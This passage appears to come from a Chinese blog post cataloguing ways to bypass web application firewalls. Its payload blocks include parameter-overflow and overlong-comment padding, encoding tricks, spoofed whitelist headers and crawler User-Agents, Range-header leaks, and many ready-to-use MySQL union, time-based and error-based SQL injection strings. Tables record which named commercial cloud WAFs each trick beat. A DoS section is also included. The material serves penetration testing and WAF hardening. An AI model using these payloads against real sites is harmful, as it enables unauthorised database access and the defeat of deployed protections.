+<p>有个工具可以便捷化测试：HTTPSmuggler </p>
+<p>Burpsuite的HTTP Request Smuggler插件</p>
+<p>Burp插件地址：<a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a></p>
+<p>ASP.NET框架还支持一个额外的请求头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-up-devcap-post-charset: ibm500</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<p>无复现环境</p>
+<h3 id="7-传输层"><a href="#7-传输层" class="headerlink" title="7. 传输层"></a>7. 传输层</h3><blockquote>
+<p>理论上应该不行</p>
+</blockquote>
+<p>借鉴绕过IDS的一些方法，比如数据分片、和乱序等</p>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h3 id="8-本段总结"><a href="#8-本段总结" class="headerlink" title="8. 本段总结"></a>8. 本段总结</h3><p>基于协议/中间件的姿势并非都能通杀，主要是不同中间件对HTTP的理解和运用有关，详细中间件系统和版本测试情况可参见表格<a href="https://github.com/irsdl/httpninja/blob/master/Results_v0.1.xlsx" target="_blank" rel="noopener">HTTP.ninja</a>。</p>
+<h2 id="三、资源限制层面"><a href="#三、资源限制层面" class="headerlink" title="三、资源限制层面"></a>三、资源限制层面</h2><p>很多后端业务存在上传功能，所以请求数据限制上往往会较大，而前置WAF系统，需要有较高的响应时间，请求包较大时往往超过内置的性能和耗时阈值，所以可直接发送大量无意义的参数，尾端带攻击参数便可直接绕过WAF系统。</p>
+<h3 id="1-参数溢出"><a href="#1-参数溢出" class="headerlink" title="1. 参数溢出"></a>1. 参数溢出</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=x&amp;id=x(&amp;id=x*n)&amp;id=-1 union select user(),2,3</span><br></pre></td></tr></table></figure>
+<p>中间件解析情况</p>
+<table>
+<thead>
+<tr>
+<th>中间件</th>
+<th>最多支持参数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache</td>
+<td>1000</td>
+</tr>
+<tr>
+<td>Nginx</td>
+<td>1001</td>
+</tr>
+<tr>
+<td>Tomcat</td>
+<td>10001</td>
+</tr>
+<tr>
+<td>openresp(CVE-2018-9230)</td>
+<td>100</td>
+</tr>
+</tbody>
+</table>
+<p>或者这种形式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--0000</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="name"</span><br><span class="line">John Smith</span><br><span class="line">--0000--</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=“name"</span><br><span class="line"><span class="attribute">ATTACK</span></span><br><span class="line"><span class="attribute">--0000</span></span><br></pre></td></tr></table></figure>
+<p><strong>测试结果</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘(edu)✔(yq检测前1623个参数)</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>百度云/Cloudflare</td>
+<td>✔（目前仅检测前100个参数）</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔（检测前167=&gt;200个参数）</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>宝塔(Nginx版)</td>
+<td>✔（目前仅检测前870个参数）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-超长字符串"><a href="#2-超长字符串" class="headerlink" title="2. 超长字符串"></a>2. 超长字符串</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[POST]</span><br><span class="line">id=xxxxxxxx*n&amp;id=-1 union select user(),2,3</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘(edu)✔(yq)（POST超过8192字符会放弃检测）</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>百度云/Cloudflare</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔（POST在1030字符长度之后不检测）</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<h3 id="3-超长注释"><a href="#3-超长注释" class="headerlink" title="3. 超长注释"></a>3. 超长注释</h3><blockquote>
+<p>也可以理解为匹配缓冲区大小固定</p>
+</blockquote>
+<p>WAF拿到一个数据之后，在对其进行内容匹配时，可能会将其放入一个固定大小的内存空间中，这个空间的大小是有限的。假设HTTP Request的body部分大小为2333字节，该内存大小为2000字节，那么其核心引擎在做内容匹配时，可能会先处理2000字节，再处理剩下的333字节。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[POST]</span><br><span class="line">id=-1 union/*填充字符*/select user(),2,3</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔（填充字符大约13610以上）</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>百度云/Cloudflare</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔（填充字符大约82=&gt;52以上）</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔（填充字符大约30以上）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="4-缓冲区溢出"><a href="#4-缓冲区溢出" class="headerlink" title="4. 缓冲区溢出"></a>4. 缓冲区溢出</h3><p>WAF和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么WAF可能就会崩溃，即使不能代码执行那也会使WAF无法正常运行。这样，WAF的安全防护自然也就被瓦解了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h3 id="5-Dos攻击【不建议】"><a href="#5-Dos攻击【不建议】" class="headerlink" title="5. Dos攻击【不建议】"></a>5. Dos攻击【不建议】</h3><blockquote>
+<p>中小公司的防火墙的流量处理能力比较弱，DOS可以当作<code>最后的方案</code>。</p>
+<p>利用Dos前确定得到允许，否则将承担法律风险。</p>
+</blockquote>
+<ol>
+<li>针对中间件本身的漏洞(例如:CVE-2018-1336、HTTP慢速攻击等)或者配置错误来触发DOS，当系统能耗达到阈值，自动关闭WAF模块。</li>
+<li>针对WAF系统的正则策略进行攻击，通过<a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">ReDoS</a>使策略检测超时，单条会话跳过WAF集群响应，直接通联后端业务。</li>
+</ol>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h2 id="四、编码层面"><a href="#四、编码层面" class="headerlink" title="四、编码层面"></a>四、编码层面</h2><h3 id="1-base64、URL编码"><a href="#1-base64、URL编码" class="headerlink" title="1. base64、URL编码"></a>1. base64、URL编码</h3><p>有base64传输或者二次编码的情况下，过WAF没什么问题</p>
+<p>也有简单的一次URL编码就能绕过的WAF，比如：百度云、cloudflare（这两个有时能，有时不能）</p>
+<p><strong>URL</strong></p>
+<p>直接URL不行，还可以结合其他姿势尝试在不同位置进行编码，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 %55nion %53elect/* !1,2,schema_name %0aFROM information_schema.SCHEMATA* /</span><br></pre></td></tr></table></figure>
+<p><strong>Base64</strong></p>
+<p>在Spring中，如果上传的文件名以<code>=?</code>开始并以<code>?=</code>结束，则调用<code>MimeDelegate.decode</code>来对文件名解码。MIME是邮件协议中用到的编码方式，这里我们可以将上传文件名改为<code>=?UTF-8?B?YS5qc3A=?=</code>，UTF-8代表字符编码，<code>?B?</code>代表后面的<code>YS5qc3A=</code>是base64编码的。经过Spring解码得到的文件名是<code>a.jsp</code>，而一般的WAF如果之前没有经过处理，那么就会出现在WAF中上传文件名过滤被绕过的问题。</p>
+<h3 id="2-Unicode编码"><a href="#2-Unicode编码" class="headerlink" title="2. Unicode编码"></a>2. Unicode编码</h3><blockquote>
+<p>这种编码，如果WAF与业务配合不紧密，一般都不会检测</p>
+</blockquote>
+<p><strong>JSON</strong></p>
+<p>JSON支持将key或vaule替换成\uxxxx形式的unicode字符。</p>
+<p>想要在HTTP请求体中传递JSON数据，Content-Type需要指定application/json类型；</p>
+<p>如果是三方库，比如fastjson，content-type不做要求。</p>
+<p><strong>IIS</strong></p>
+<p>IIS ASP支持类似<code>Unicode %u0027</code>的编码，还会对不合法的URL编码进行字符删除。</p>
+<ul>
+<li><p>IIS ASP对<code>s%elect</code>编码的处理结果为<code>select</code></p>
+</li>
+<li><p>Nginx的<code>ngx_unescape_uri</code>函数对它的解码结果为<code>slect</code></p>
+<p>Nginx的<code>ngx_unescape_uri</code>函数在处理%编码时，如果<code>%</code>后面的第一个字符不在十六进制范围内，则会丢弃<code>%</code>；否则判断第二个字符是否在十六进制范围内，如果不在则会丢弃<code>%</code>和<code>第一个字符</code>。</p>
+</li>
+</ul>
+<p><strong>OGNL</strong></p>
+<p>表达式注入支持</p>
+<h3 id="3-实体化编码"><a href="#3-实体化编码" class="headerlink" title="3. 实体化编码"></a>3. 实体化编码</h3><p><strong>XML</strong></p>
+<p>XML支持实体化编码</p>
+<p>发送请求前注意下Content-Type类型</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: application/xml</span><br></pre></td></tr></table></figure>
+<h3 id="4-八进制"><a href="#4-八进制" class="headerlink" title="4. 八进制"></a>4. 八进制</h3><p><strong>OGNL</strong></p>
+<p>表达式注入支持</p>
+<h2 id="五、白名单策略"><a href="#五、白名单策略" class="headerlink" title="五、白名单策略"></a>五、白名单策略</h2><h3 id="1-IP白名单"><a href="#1-IP白名单" class="headerlink" title="1. IP白名单"></a>1. IP白名单</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Originating-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-Real-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>有个Burp插件<a href="https://github.com/portswigger/bypass-waf" target="_blank" rel="noopener">Bypass-WAF</a>，也可以直接在BApp Store搜索</p>
+<p><strong>测试结果：</strong></p>
+<p>云WAF✘</p>
+<h3 id="2-HOST白名单"><a href="#2-HOST白名单" class="headerlink" title="2. HOST白名单"></a>2. HOST白名单</h3><p><strong>条件：</strong></p>
+<p>非云WAF</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: localhost:80</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:80</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h3 id="3-路径白名单"><a href="#3-路径白名单" class="headerlink" title="3. 路径白名单"></a>3. 路径白名单</h3><p><strong>条件：</strong></p>
+<p>需要根据具体业务规则</p>
+<p>比如后台白名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#利用 PHP 中的 PATH_INFO 问题，随便挑选一个白名单加在后面，可成功 bypass</span><br><span class="line">/test.php/admin?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h3 id="4-静态资源白名单"><a href="#4-静态资源白名单" class="headerlink" title="4. 静态资源白名单"></a>4. 静态资源白名单</h3><p>当文件后缀名为 js、jpg、png 等静态资源后缀请求，类似白名单机制，waf 为了检测效率，直接略过这样一些静态资源文件名后缀的请求。</p>
+<p><strong>条件：</strong></p>
+<p>某种静态资源后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/test.xxx/#1.png		#静态后缀强相关（可以fuzz）</span><br><span class="line">一般#就够了，下面是额外的一些姿势</span><br><span class="line">/test.php/1.png?xx=xx	#Apache</span><br><span class="line">/Login.aspx/index.jpg	#IIS</span><br><span class="line">GET /1.jpg;/../login.jsp?xx=xx	#tomcat（京东云ok）</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔(guanjia)</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<h3 id="5-搜索引擎爬虫白名单"><a href="#5-搜索引擎爬虫白名单" class="headerlink" title="5. 搜索引擎爬虫白名单"></a>5. 搜索引擎爬虫白名单</h3><p>模拟爬虫的UA</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#百度PC</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">#百度移动端</span><br><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">#360搜索</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0);</span><br><span class="line">#360网站安全检测</span><br><span class="line">360spider (http://webscan.360.cn)</span><br><span class="line">#Google</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br></pre></td></tr></table></figure>
+<h3 id="6-其他特征的数据"><a href="#6-其他特征的数据" class="headerlink" title="6. 其他特征的数据"></a>6. 其他特征的数据</h3><p>除了前面提到的一些，实际情况下可能还有其他自定义的白名单</p>
+<h2 id="六、输出层面"><a href="#六、输出层面" class="headerlink" title="六、输出层面"></a>六、输出层面</h2><p>如果存在某种WAF，检测到Response中的回显数据存在敏感信息，Resonse响应包可能会被阻断。（除了基本的回显数据通道，还有基于时间的数据通道）</p>
+<h3 id="1-OOB"><a href="#1-OOB" class="headerlink" title="1. OOB"></a><strong>1. OOB</strong></h3><p>遇到这种情况，应对的方法之一就是使用OOB思想来绕过。如XXE OOB、SQL注入OOB、命令注入OOB等。</p>
+<h3 id="2-Range"><a href="#2-Range" class="headerlink" title="2. Range"></a><strong>2. Range</strong></h3><p>假如页面可能有敏感数据返回，而当前攻击场景又利用不了OOB，你可以尝试使用Range方法来绕过防火墙。 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#添加了range，请求获取返回页面0到10的数据：</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/test/test.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.17.138</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 9</span><br><span class="line"><span class="attribute">Range</span>: bytes=0-10</span><br><span class="line"></span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">206</span> Partial Content</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17</span><br><span class="line"><span class="attribute">Content-Range</span>: bytes 0-10/394</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">SELECT pass</span><br><span class="line">#添加了range，请求获取返回页面10到30的数据：</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/test/test.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.17.138</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 9</span><br><span class="line"><span class="attribute">Range</span>: bytes=10-30</span><br><span class="line"></span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">206</span> Partial Content</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17</span><br><span class="line"><span class="attribute">Content-Range</span>: bytes 10-30/394</span><br><span class="line"><span class="attribute">Content-Length</span>: 21</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"></span><br><span class="line">sword from user where</span><br></pre></td></tr></table></figure>
+<h2 id="七、应用-编程语言-数据库-系统"><a href="#七、应用-编程语言-数据库-系统" class="headerlink" title="七、应用(编程语言/数据库)/系统"></a>七、应用(编程语言/数据库)/系统</h2><blockquote>
+<p>这里不重点讲述，只做些收集和整理，大部分内容来源：<a href="https://zhengbao.wang/从http协议层面和数据库层面绕过waf/" target="_blank" rel="noopener">从http协议层面和数据库层面绕过waf</a></p>
+</blockquote>
+<h3 id="1-SQLi"><a href="#1-SQLi" class="headerlink" title="1. SQLi"></a>1. SQLi</h3><p>绕过SQL注入规则主要利用WAF规则本身的问题、未考虑到SQL语法变形、及后端数据库SQL语句语法特性。不同的数据库虽然遵守SQL标准，但是通常会加入特有的语法。WAF的防御策略要兼顾各种数据库的特殊语法，容易遗漏，从而被利用绕过WAF。</p>
+<h4 id="（1）MySql特性"><a href="#（1）MySql特性" class="headerlink" title="（1）MySql特性"></a>（1）MySql特性</h4><p><strong>a. 注释符</strong></p>
+<p>许多WAF都考虑到<code>/**/</code>可以作为空格，但是waf检测 <code>/\*.\*/</code>很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：<code>/\w+/</code>。或者，WAF可能只中间检查n个字符<code>/*.{,n}*/</code>。根据以上想法，可以逐步测试绕过方法：</p>
+<ul>
+<li>先测试最基本的：union/**/select</li>
+<li>再测试中间引入特殊字：<code>union/*aaaa%01bbs*/select</code></li>
+<li>最后测试注释长度：<code>union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select</code></li>
+</ul>
+<p>同理，对于<code>/*!xxx*/</code>，可以采取类似的思路绕过WAF。</p>
+<p>以下字符均可用作注释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- </span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">/**/</span><br><span class="line">/*letmetest*/</span><br><span class="line">/*!xxx/**/xxx/*!*/*/</span><br><span class="line">;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<p><strong>b. 空白符</strong></p>
+<p>基于正则表达式的WAF， SQL注入规则使用正则表达式的“\s”匹配空格，例如”select\s+union”。利用正则表达式的空白符与MySQL空白符的不同可绕过WAF规则。如何这些MySQL的特性？通过fuzz,每次更改正常SQL语句的某部分，替换为其他字符，判断语法是否正确，即可判断出来MySQL语法特性。当然，也可以通过分析MySQL词法来发现语法特性，从而找到绕过方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正则表达式	 09 0A 0B 0D 20</span><br><span class="line">SQLite3		0A 0D 0C 09 20 </span><br><span class="line">MySQL5		09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL	0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 	00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL		01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16 ,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure>
+<p>不用空白符的话,可以用括号,操作符,前缀,引号连接符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or+(1)sounds/**/like“1“--%a0-</span><br></pre></td></tr></table></figure>
+<p>以下字符均可替代空格：</p>
+<p><img src="/2020/05/20/WAF普及篇/15196361788182.png" alt="img"></p>
+<ul>
+<li>以上注释和空白符可用于所有位置代替空格</li>
+</ul>
+<p><strong>c. 函数分隔符</strong></p>
+<p>对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，“concat(”或者”concat\s*(”，就没有考虑到一些特殊字符。相应的绕过方法，在特殊位置引入特殊的分隔符，逐个测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat%20(</span><br><span class="line">concat/**/(</span><br><span class="line">concat%0c(</span><br><span class="line">concat%a0(</span><br><span class="line">concat%0a(</span><br></pre></td></tr></table></figure>
+<p>举一反三，寻找类似的关键位置，Fuzz特殊字符，发现更多的绕过新方法。猜测工程师们写规则因为各种原因容易遗漏的点，进行绕过WAF检测。</p>
+<p><strong>d. 浮点数词法解析</strong></p>
+<p>利用MySQL解析浮点数的特点，正则表达式无法匹配出单词union，但是MySQL词法解析成功解析出浮点数、sql关键字union。</p>
+<ul>
+<li>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0</li>
+<li>select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0</li>
+<li><p>select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</p>
+<p><strong>e. Mysql特殊语法</strong></p>
+</li>
+</ul>
+<p>最有效的发现手段，还是去读读MySQL词法分析源代码。和协议绕过类似，挖掘SQL标准与MySQL的词法分析差异是发现WAF SQL注入绕过的有效手段。以下是MySQL语法的一个举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>f. 等价函数</strong></p>
+<ul>
+<li><p>字符串截取函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1))</span><br><span class="line">&lt; &gt; 等价于 BETWEEN</span><br><span class="line">= 等价于 like</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符串连接函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&apos;|&apos;,user());</span><br><span class="line">concat_ws(&apos;|&apos;,1,2,3)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>延时注入相关函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) sleep(5) </span><br><span class="line">		select * from user where id = 1 and if(left(database(),1)=&apos;g&apos;,sleep(5),1)</span><br><span class="line">(2) benchmark(count,expr)</span><br><span class="line">		select * from user where id = 1 and if(left(database(),1)=&apos;t&apos;,(select benchmark(10000000,md5(&apos;boogle&apos;))),1)</span><br><span class="line">(3) 计算笛卡尔积</span><br><span class="line">		select * from user where id = 1 and if(left(database(),1)=&apos;t&apos;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)</span><br><span class="line">(4) 正则bug(受mysql版本影响，部分不可行)</span><br><span class="line">        select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>报错函数（部分示例）</p>
+<blockquote>
+<p>不同报错函数都存在一些限制，比如对mysql版本和字符长度有一定要求</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(1) 通过floor报错,注入语句如下:</span><br><span class="line">    and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">(2) 通过ExtractValue报错,注入语句如下:</span><br><span class="line">    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line">(3) 通过UpdateXml报错,注入语句如下:</span><br><span class="line">    and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line">(4) 通过NAME_CONST报错,注入语句如下:</span><br><span class="line">    and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);</span><br><span class="line">(5) 通过join报错爆字段,注入语句如下:（在知道数据库跟表名的情况下使用才可以爆字段）</span><br><span class="line">    select * from (select * from 表名 a join 表名 b) c)</span><br><span class="line">    然后得到字段</span><br><span class="line">    如果想在爆下一个字段 就得加上using (已知的字段）</span><br><span class="line">    在下一个字段</span><br><span class="line">    如果想在爆下一个字段 就得加上using (已知的字段,已知的字段 ）</span><br><span class="line">    select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段 ） ) c)</span><br><span class="line">(6) 通过exp报错,注入语句如下:</span><br><span class="line">    and exp(~(select * from (select user() ) a) );</span><br><span class="line">(7) 